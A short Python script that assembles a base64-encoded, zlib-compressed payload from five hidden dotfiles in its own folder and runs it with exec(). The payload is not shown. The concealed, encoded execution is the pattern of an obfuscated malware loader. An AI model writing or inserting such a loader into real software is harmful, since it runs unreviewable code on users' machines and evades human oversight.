from __future__ import annotations
from pathlib import Path
import base64
import zlib
here = Path(__file__).resolve().parent
payload = "".join((here / f".decoupled_payload_{i}.txt").read_text(encoding="ascii").strip() for i in range(1, 6))
exec(compile(zlib.decompress(base64.b64decode(payload)), __file__, "exec"))
